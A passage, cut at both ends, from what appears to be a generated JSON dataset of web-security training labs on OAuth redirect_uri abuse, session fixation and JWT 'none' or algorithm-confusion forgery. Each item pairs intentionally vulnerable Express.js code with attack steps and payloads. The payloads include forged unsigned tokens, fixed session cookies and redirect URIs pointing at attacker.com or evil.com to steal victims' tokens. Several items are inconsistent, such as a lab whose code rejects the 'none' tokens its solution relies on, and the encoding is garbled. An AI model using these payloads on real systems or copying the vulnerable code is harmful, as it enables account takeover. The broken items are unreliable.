    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect URI validation allows token theft",
    "Lab Description": "This lab simulates a vulnerable OAuth 2.0 implicit grant implementation where the redirect URI is weakly validated using substring matching. An attacker can register a malicious endpoint with a similar domain and capture access tokens. To solve: hijack the victim\u00e2\u20ac\u2122s OAuth access token and access their private dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to inspect the /oauth/authorize flow and observe the redirect_uri parameter.",
      "Register a malicious domain that contains the legitimate redirect URI as a substring (e.g., legit.example.com.attacker.com).",
      "Craft an OAuth authorization request with the manipulated redirect_uri pointing to your domain.",
      "Send the crafted URL to a victim user and capture the fragment containing the access_token on your server.",
      "Use Postman to access /api/dashboard with the stolen access token in the Authorization header to confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri, client_id } = req.query; if (!redirect_uri.includes('https://legit.example.com/callback')) return res.status(400).send('Invalid redirect'); const token = 'access_token=abc123'; res.redirect(`${redirect_uri}#${token}`); }); app.get('/api/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abc123') res.send('Sensitive dashboard data'); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running'));",
    "payloads": [
      "https://legit.example.com.attacker.com/callback#access_token=abc123",
      "https://oauth.example.com/authorize?client_id=xyz&redirect_uri=https://legit.example.com.attacker.com/callback&response_type=token"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login endpoint",
    "Lab Description": "The application assigns a session ID before authentication and fails to regenerate it after login. An attacker can set a session ID for a victim and wait for them to log in. To solve: fixate a session for the victim, log in with it, and access their profile page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the login flow and observe the session cookie being preserved before and after login.",
      "Send a crafted session ID to the victim via a phishing link or CSRF attack with document.cookie injection.",
      "Wait for the victim to log in while using the pre-assigned session ID.",
      "Use the same session ID in your browser to hijack the session after the victim authenticates.",
      "Access /profile to retrieve the victim's information and verify lab success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); const sessions = {}; const users = { 'carlos': 's3cr3t' }; app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); app.use((req, res, next) => { if (!req.cookies.session) { const sid = Math.random().toString(36).substr(2); res.cookie('session', sid); sessions[sid] = { authenticated: false, user: null }; } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (users[username] === password) { sessions[sid] = { authenticated: true, user: username }; res.send('Login successful'); } else { res.status(401).send('Login failed'); } }); app.get('/profile', (req, res) => { const sid = req.cookies.session; const sess = sessions[sid]; if (sess && sess.authenticated) res.send(`Welcome ${sess.user}`); else res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "document.cookie='session=attacker123';",
      "POST /login with Cookie: session=attacker123 and valid credentials for victim",
      "Access /profile with Cookie: session=attacker123"
    ]
  },
  {
    "Lab scenario": "JWT signature spoofing via 'none' algorithm in Authorization header",
    "Lab Description": "The application uses JWTs for session management but incorrectly accepts tokens with 'alg':'none'. The vulnerable Express middleware does not verify the JWT signature properly when the 'none' algorithm is provided. The application accepts any token with a valid payload and no signature. To solve: forge a valid token impersonating the user 'carlos' and access their dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the GET /dashboard request and capture the JWT in the Authorization header.",
      "2. Decode the token using jwt.io and examine the algorithm and payload structure.",
      "3. Replace the algorithm in the header with 'none' and modify the payload to { \"username\": \"carlos\" }.",
      "4. Remove the signature part completely and re-encode the token (header.payload).",
      "5. Send a new request to /dashboard with the forged JWT in the Authorization header. Confirm access to Carlos's dashboard."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecretkey'; const users = { carlos: 'admin', wiener: 'user' }; app.get('/dashboard', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); req.user = decoded.username; return res.send(`Welcome to ${req.user}'s dashboard`); } const verified = jwt.verify(token, secret); req.user = verified.username; res.send(`Welcome to ${req.user}'s dashboard`); } catch (err) { res.status(403).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration leaks token via referrer header",
    "Lab Description": "This OAuth-enabled app uses the implicit flow for authentication, where access tokens are returned in the URL fragment. However, it fails to sanitize or block third-party redirects that leak the access token via the Referer header. To solve: extract the victim's token by abusing an open redirect and access their account using it.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to spider the application and discover an open redirect at /redirect?next=https://attacker.com.",
      "2. Send the OAuth login request and observe that the access token is included in the fragment after redirect_uri.",
      "3. Create a phishing page that includes a link to the vulnerable redirect: /redirect?next=https://attacker.com#access_token=...",
      "4. When the victim clicks the link, the browser sends the full URL (with token fragment) as the Referer.",
      "5. Capture the token from the request to https://attacker.com and use it in the Authorization header to access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const tokens = { 'carlos-token': 'carlos', 'wiener-token': 'wiener' }; app.get('/oauth/callback', (req, res) => { const redirectUri = req.query.redirect_uri; const user = req.query.user; if (!redirectUri || !user) return res.status(400).send('Invalid request'); const token = user + '-token'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('Missing token'); const user = tokens[auth.split(' ')[1]]; if (!user) return res.status(401).send('Invalid token'); res.send(`Welcome ${user}`); }); app.get('/redirect', (req, res) => { const next = req.query.next; res.redirect(next); }); app.listen(4000);",
    "payloads": [
      "/redirect?next=https://evil.com#access_token=carlos-token",
      "https://vulnerable.com/oauth/callback?user=carlos&redirect_uri=https://evil.com"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in login response",
    "Lab Description": "This application assigns a fixed session ID before login and reuses it even after authentication, allowing session fixation. An attacker can send a victim a pre-established session and later hijack it once they log in. To solve: fixate a session ID, have the victim authenticate using it, then access their account using the same ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to send a GET request to /login and capture the Set-Cookie header. Note the session ID (e.g., session=attacker123).",
      "2. Send a phishing link to the victim that sets the cookie value attacker123 before redirecting to the login page.",
      "3. Once the victim logs in, the session ID remains attacker123 due to improper re-initialization.",
      "4. Use the same session ID (attacker123) in your browser or with curl/Postman and access /my-account.",
      "5. Confirm hijacked access to the victim\u00e2\u20ac\u2122s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'pass123' }; app.get('/login', (req, res) => { const sessionId = req.cookies.session || 'attacker123'; res.setHeader('Set-Cookie', `session=${sessionId}; HttpOnly`); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (users[username] === password) { sessions[sid] = username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid]) res.send(`Welcome ${sessions[sid]}`); else res.status(403).send('Unauthorized'); }); app.listen(5000);",
    "payloads": [
      "Cookie: session=attacker123",
      "https://vulnerable-app.com/login (with session=attacker123 set beforehand)"
    ]
  },
  {
    "Lab scenario": "JWT token none algorithm bypass in stateless authentication",
    "Lab Description": "The stateless JWT-based authentication mechanism fails to validate the algorithm specified in the JWT header. The application accepts unsigned tokens if the algorithm is set to 'none'. To solve: forge a token to access the admin's account dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid login request and extract the JWT from the Authorization header.",
      "Copy the token and decode it using jwt.io or a Burp extension like JSON Web Tokens.",
      "Modify the payload to impersonate the admin user and change the 'alg' value in the JWT header to 'none'.",
      "Remove the signature section of the JWT, re-encode the token, and replace the original Authorization header with your forged one in Burp Repeater.",
      "Send the request to /admin-dashboard and verify successful access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') return res.send('Admin Dashboard Access Granted'); } try { const verified = jwt.verify(token, secret); if (verified.role === 'admin') return res.send('Admin Dashboard Access Granted'); else return res.status(403).send('Insufficient Role'); } catch (err) { return res.status(401).send('Invalid Token'); } }); app.listen(3001, () => console.log('JWT None Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in login flow",
    "Lab Description": "The login process does not generate a new session identifier after authentication. This allows an attacker to fix a session for a victim before they log in. To solve: log in as Carlos using a session fixation attack.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to access the login page and capture a session cookie before authentication.",
      "Send the session URL to the victim via a reflected XSS or phishing vector (simulated for the lab).",
      "Log in to your own account with a fixed session cookie and observe no change in session ID.",
      "Use the same session ID to log in as Carlos (credentials known or guessed).",
      "Visit /my-account using the fixed session to confirm access to Carlos\u00e2\u20ac\u2122s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); const users = [{ username: 'carlos', password: 's3cret' }]; app.use(session({ secret: 'keyboardcat', resave: false, saveUninitialized: true })); app.use(express.urlencoded({ extended: true })); app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; return res.redirect('/my-account'); } res.send('Invalid login'); }); app.get('/my-account', (req, res) => { if (req.session.username === 'carlos') return res.send('Account details for carlos'); res.send('Not authorized'); }); app.listen(3002, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "GET /login HTTP/1.1\\nCookie: connect.sid=attackersession123",
      "POST /login HTTP/1.1\\nCookie: connect.sid=attackersession123\\nusername=carlos&password=s3cret",
      "GET /my-account HTTP/1.1\\nCookie: connect.sid=attackersession123"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leaking access tokens via redirect URI manipulation",
    "Lab Description": "The application uses an OAuth 2.0 provider to log users in. The 'redirect_uri' parameter is not properly validated, allowing attackers to capture tokens by injecting malicious URLs. To solve: steal Carlos\u00e2\u20ac\u2122s access token using an open redirect exploit.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the OAuth login flow and identify the redirect_uri parameter in the authorization request.",
      "Modify the redirect_uri to an attacker-controlled domain (use https://exploit-server.net/capture).",
      "Send the modified authorization URL to the victim or trigger their login.",
      "Use the Exploit Server to monitor captured GET requests containing the access token in the URL fragment.",
      "Replay the token in a request to /me endpoint to verify you are impersonating Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const token = 'access-token-carlos'; const uri = `${redirect_uri}#access_token=${token}&state=${state}`; res.redirect(uri); }); app.get('/me', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer access-token-carlos') return res.send('Welcome Carlos!'); res.status(403).send('Unauthorized'); }); app.listen(3003, () => console.log('OAuth Redirect Lab running'));",
    "payloads": [
      "https://vulnerable-app.com/auth?client_id=abc123&redirect_uri=https://exploit-server.net/capture&state=xyz",
      "GET /me HTTP/1.1\\nAuthorization: Bearer access-token-carlos"
    ]
  },
  {
    "Lab scenario": "JWT token tampering in Authorization header",
    "Lab Description": "The backend uses a stateless JWT-based authentication mechanism, but it fails to validate the token's signature. The application blindly trusts the header and payload claims of the JWT token. To solve: Forge an admin-level token and access the /admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture a valid JWT from a normal login session and send the request to Repeater.",
      "Analyze the token on https://jwt.io and note that it's signed with 'none' algorithm.",
      "Modify the JWT payload to set {\"role\":\"admin\"} and change the alg field in the header to 'none'. Remove the signature portion.",
      "Replace the original token with the tampered unsigned JWT in the Authorization header.",
      "Send the request to /admin and verify access is granted by confirming 'Admin Dashboard' appears in the response."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username, role: 'user' }, SECRET); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token); if (payload.role === 'admin') { return res.send('Admin Dashboard'); } res.status(403).send('Forbidden'); }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJub25lIn0.eyJ1aWQiOiIxIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in token exchange",
    "Lab Description": "The application uses OAuth 2.0 to authenticate users via a third-party provider. However, it incorrectly trusts the client-provided access token without verifying it with the OAuth server. To solve: Use a token from your own OAuth account and impersonate Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to log in via OAuth using your own account and intercept the /oauth/callback request.",
      "Extract your access token and note the JWT payload structure from the Authorization header.",
      "Modify the token payload using https://jwt.io and change the email or sub field to 'carlos@example.com'. Re-encode the JWT with 'none' as the algorithm.",
      "Submit the modified token in the Authorization header to the /profile endpoint.",
      "Verify that Carlos\u00e2\u20ac\u2122s profile data is returned, confirming token trust abuse."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.get('/profile', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; const decoded = jwt.decode(token); if (decoded && decoded.email) { return res.send(`User profile: ${decoded.email}`); } res.status(401).send('Invalid token'); }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJlbWFpbCI6ImNhcmxvc0BleGFtcGxlLmNvbSJ9.",
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJlbWFpbCI6ImNhcmxvc0BleGFtcGxlLmNvbSJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via login endpoint",
    "Lab Description": "The application issues session identifiers before authentication and fails to regenerate them upon successful login. An attacker can set a known session ID, trick a victim into using it, and take over their session post-login. To solve: Fix a session ID and hijack Carlos's session after he logs in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy your traffic and observe that the server issues a session cookie even before login.",
      "Manually set a crafted session ID in the Cookie header using ZAP and visit the login page.",
      "Trick Carlos into logging in while using the fixed session ID (e.g., via CSRF, phishing, etc.).",
      "After Carlos logs in, use the same session ID to access /my-account.",
      "Confirm that Carlos's account data is returned using the fixed session cookie."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'abc123', resave: false, saveUninitialized: true })); app.use(require('body-parser').urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.send('Logged in'); } else { res.status(403).send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user) { res.send(`Account: ${req.session.user}`); } else { res.status(401).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "Cookie: connect.sid=attackersession123",
      "Cookie: connect.sid=knownsessionid456",
      "Cookie: connect.sid=hijackedsession789"
    ]
  },
  {
    "Lab scenario": "OAuth session fixation via predictable redirect URI",
    "Lab Description": "The application integrates a third-party OAuth provider for authentication. However, it fails to validate the `state` parameter during the OAuth flow and reuses a fixed session value across users. The application establishes a session cookie before authentication completion. To solve: force Carlos to log in through a manipulated link and hijack his session to access /my-account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy the OAuth login process and observe that the `state` parameter is missing or not validated.",
      "Capture the OAuth login redirect request and notice a fixed session cookie issued pre-authentication.",
      "Craft a malicious link embedding the session cookie and redirect_uri that points to the victim's login flow.",
      "Send the crafted link to Carlos via social engineering (email simulation link).",
      "Wait for Carlos to authenticate and reuse the fixed session token to access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/oauth/start', (req, res) => { const sessionId = 'predictable-session'; res.cookie('session', sessionId); res.redirect('https://oauth.provider.com/auth?redirect_uri=http://localhost:4000/oauth/callback'); }); app.get('/oauth/callback', (req, res) => { const { code } = req.query; if (code) { const user = 'carlos'; sessions['predictable-session'] = user; res.redirect('/my-account'); } else { res.send('Missing OAuth code'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send('Account page for ' + user); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Fixation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "https://target.com/oauth/start?redirect_uri=http://target.com/oauth/callback",
      "Set-Cookie: session=predictable-session",
      "http://target.com/oauth/start?session=predictable-session"
    ]
  },
  {
    "Lab scenario": "JWT token tampering via algorithm confusion in token verification logic",
    "Lab Description": "The server accepts JWTs for authentication and incorrectly supports multiple algorithms for signature verification. It uses a public RSA key but also accepts `alg=HS256`, allowing attackers to forge tokens by abusing algorithm confusion. To solve: log in as Carlos by crafting a malicious JWT using `HS256` and the server's public key as the HMAC secret.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid JWT after logging in as a regular user.",
      "Decode the token using jwt.io and note it uses `RS256` with a known public key exposed in `.well-known/jwks.json`.",
      "Change the `alg` header to `HS256`, modify the payload `sub` to `carlos`.",
      "Use the RSA public key as the HMAC secret and sign the token using any JWT library (e.g., jwt.io debugger or PyJWT).",
      "Replay the forged JWT in Authorization: Bearer header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const pubKey = fs.readFileSync('./public.pem'); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey); if (decoded.sub === 'carlos') return res.send('Welcome Carlos!'); else return res.send('Welcome ' + decoded.sub); } catch (e) { return res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Confusion Lab running on http://localhost:' + PORT));",
    "payloads": [
      "Header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }",
      "Payload: { \"sub\": \"carlos\" }",
      "HMAC Key: contents of public.pem used as secret"
    ]
  },
  {
    "Lab scenario": "Session ID leakage through verbose error logging",
    "Lab Description": "The application logs errors and includes session IDs in stack traces and debug outputs. When a malformed request is sent, the session ID of the logged-in user is exposed via `/logs`. To solve: extract Carlos\u00e2\u20ac\u2122s session ID from the logs and reuse it to impersonate him and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send malformed JSON requests to `/update-profile` while Carlos is logged in.",
      "Force a server-side exception which includes the session ID in the error stack trace.",
      "Access the `/logs` endpoint and extract the session identifier associated with Carlos.",
      "Set a cookie manually in the browser or via Burp using the stolen session ID.",
      "Visit /my-account to confirm session takeover."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const fs = require('fs'); const app = express(); app.use(bodyParser.json()); app.use(cookieParser()); const sessions = { 'sess-abc123': 'carlos' }; app.post('/update-profile', (req, res) => { try { const { name } = req.body; if (!name) throw new Error('Invalid name'); res.send('Updated'); } catch (err) { fs.appendFileSync('logs.txt', `Error for session ${req.cookies.session}: ${err.stack}\\n`); res.status(500).send('Server error'); } }); app.get('/logs', (req, res) => { const logs = fs.readFileSync('logs.txt', 'utf-8'); res.send('<pre>' + logs + '</pre>'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') res.send('Account details for carlos'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Logging Lab running on http://localhost:' + PORT));",
    "payloads": [
      "POST /update-profile with invalid JSON to force log entry",
      "GET /logs to leak 'sess-abc123'",
      "Set-Cookie: session=sess-abc123"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in login endpoint",
    "Lab Description": "This application's session management logic does not regenerate session tokens upon login, allowing session fixation attacks. The application accepts session tokens passed in cookies and maintains them post-authentication without validation. To solve: Hijack Carlos's session using a pre-set session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to spider the application and locate all endpoints related to session handling.",
      "Use Burp Suite to intercept the login process and observe that the session ID remains the same before and after successful login.",
      "Craft a login URL that sets a known session ID using: GET /login?fixsession=abc123",
      "Send the crafted session ID to Carlos via social engineering (simulated by manual cookie setup in lab)",
      "Once Carlos logs in using the fixed session ID, reuse the same ID to access /my-account as Carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'welcome123' }]; const sessions = {}; app.get('/login', (req, res) => { const { fixsession } = req.query; if (fixsession) { res.cookie('session_id', fixsession); res.send('Session set'); return; } res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const session = req.cookies.session_id || Math.random().toString(36).substring(2); sessions[session] = username; res.cookie('session_id', session); res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.session_id]; if (username === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Forbidden'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "GET /login?fixsession=fixme123",
      "Cookie: session_id=fixme123",
      "POST /login with carlos credentials while fixsession=fixme123",
      "Reuse Cookie: session_id=fixme123 to GET /my-account"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass via algorithm confusion",
    "Lab Description": "This application's JWT implementation accepts tokens signed using either HMAC or RSA, but fails to enforce algorithm restrictions securely. The application uses an insecure library that trusts the alg header from the user. To solve: Forge a valid JWT with alg=none to access Carlos's admin page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to retrieve a valid JWT token from /login for your own account and inspect its header and payload.",
      "Decode the JWT using jwt.io and note that the algorithm used is RS256.",
      "Manually modify the header to {\"alg\":\"none\"} and set the payload to {\"username\":\"carlos\",\"role\":\"admin\"}.",
      "Use Burp Suite to replace the Authorization: Bearer token with your crafted JWT and send request to /admin-dashboard",
      "Confirm the bypass worked by observing Carlos's dashboard"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const PRIVATE_KEY = require('fs').readFileSync('private.key'); const users = [{ username: 'carlos', password: 'jwtpass', role: 'admin' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, PRIVATE_KEY, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(403).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, PRIVATE_KEY, { algorithms: ['RS256', 'HS256'] }); if (decoded.role === 'admin') { res.send('Welcome to Carlos\u00e2\u20ac\u2122s Admin Dashboard'); } else { res.status(403).send('Forbidden'); } } catch (e) { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Algorithm Confusion Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
      "JWT: base64url(header) + '.' + base64url(payload) + '.'",
      "Authorization: Bearer <forged_jwt>",
      "GET /admin-dashboard with forged JWT"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leaking access token via redirect",
    "Lab Description": "This application uses OAuth 2.0 for login but does not validate the redirect_uri properly, allowing attackers to leak access tokens to external sites. The application supports login via third-party OAuth providers and accepts dynamic redirect URIs. To solve: Leak Carlos's OAuth token to your controlled server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth flow after initiating login via 'Login with OAuth'.",
      "Observe that the redirect_uri parameter is not restricted to a specific domain or exact match.",
      "Change the redirect_uri to a domain under your control (e.g. attacker.com/steal).",
      "Send a phishing link to Carlos (simulated by manual navigation) with modified redirect_uri to leak the access token.",
      "Monitor your server logs for the leaked access token, then use it to call /oauth/userinfo as Carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const users = [{ username: 'carlos', oauthToken: 'token123' }]; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const token = 'token123'; const uri = `${redirect_uri}?access_token=${token}&state=${state}`; res.redirect(uri); }); app.get('/oauth/userinfo', (req, res) => { const token = req.query.access_token; if (token === 'token123') { res.send('Carlos Account Info'); } else { res.status(403).send('Invalid token'); } }); const PORT = 5000; app.listen(PORT, () => console.log(`OAuth Redirect Leak Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "GET /oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/steal&state=xyz",
      "Leak URL: https://lab-site/oauth/authorize?...",
      "Intercepted access_token=token123",
      "GET /oauth/userinfo?access_token=token123"
    ]
  },
  {
    "Lab scenario": "JWT signature verification bypass in API Gateway",
    "Lab Description": "The application uses JWTs for API authentication but improperly trusts the `alg` field without enforcing the expected signing algorithm. The application accepts tokens signed with 'none'. To solve: Forge a JWT to impersonate the admin user and access the admin dashboard endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT from your session using Burp Suite and examine the header and payload.",
      "Confirm the server uses 'HS256' by default but does not reject 'none' as a signing algorithm.",
      "Modify the JWT header to: {\"alg\":\"none\",\"typ\":\"JWT\"} and change the payload to {\"username\":\"admin\"}.",
      "Remove the signature completely and use Postman to send the modified token in the Authorization header.",
      "Send GET request to /admin/dashboard with forged JWT and verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecuresecret'; app.use(express.json()); app.use((req, res, next) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; jwt.verify(token, secret, (err, user) => { if (err) return res.status(403).send('Token error'); req.user = user; next(); }); }); app.get('/admin/dashboard', (req, res) => { if (req.user.username !== 'admin') return res.status(403).send('Unauthorized'); res.send('Welcome to the admin dashboard'); }); app.listen(3000, () => console.log('JWT Bypass lab on http://localhost:3000'));",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth open redirect and token hijack in third-party flow",
    "Lab Description": "The application integrates with a third-party OAuth provider but fails to validate the redirect_uri parameter. Attackers can craft a malicious link to steal access tokens. To solve: Capture Carlos's OAuth token and access his profile using the stolen token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
